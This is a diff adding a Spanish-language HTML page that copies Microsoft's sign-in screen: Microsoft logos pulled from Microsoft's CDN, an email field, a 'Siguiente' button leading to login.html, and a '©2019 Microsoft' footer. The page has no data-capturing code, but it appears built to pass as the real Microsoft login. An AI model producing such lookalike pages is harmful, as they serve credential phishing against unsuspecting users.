@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Iniciar sesión</title>
+  <link rel="stylesheet" href="assets/styles/index.css">
+</head>
+<body>
+  <div class="outer">
+    <div class="middle">
+      <main class="inner">
+        <div class="margin-bottom-20">
+          <picture class="logo margin-bottom-16">
+            <source srcset="https://cdn.odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.svg?b=11604.36600">
+            <img src="https://cdn.odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.png?b=11604.36600" alt="Logotipo de Microsoft">
+          </picture>
+        </div>
+        <div>
+					<div id="signInTitle" class="row text-title margin-bottom-16">Iniciar sesión</div>
+					<div id="signInDescription">
+					</div>
+					<div class="alert alert-error text-body margin-bottom-12 col-md-12" style="display: none;"></div>
+					<div class="row margin-bottom-16">
+						<div class="form-group col-md-12 placeholderContainer">
+							<input type="email" class="form-control" placeholder="Correo electrónico, teléfono o Skype" spellcheck="false" autocomplete="off">
+						</div>
+					</div>
+					<div class="row margin-bottom-20">
+						<div class="col-md-12 section text-secondary">
+							<span>¿No tiene ninguna cuenta?</span>
+							<a href="#">Crear uno.</a>
+						</div>
+					</div>
+        </div>
+        <div class="row inline-block no-margin-top-bottom button-container">
+            <input type="submit" class="btn btn-block btn-primary" value="Siguiente"
+            onclick="window.location='login.html'">
+          </div>
+      </main>
+    </div>
+  </div>
+  <footer>
+    <span>©2019 Microsoft</span>  
+    <span>Declaración de privacidad</span>
+  </footer>
+</body>
+</html>
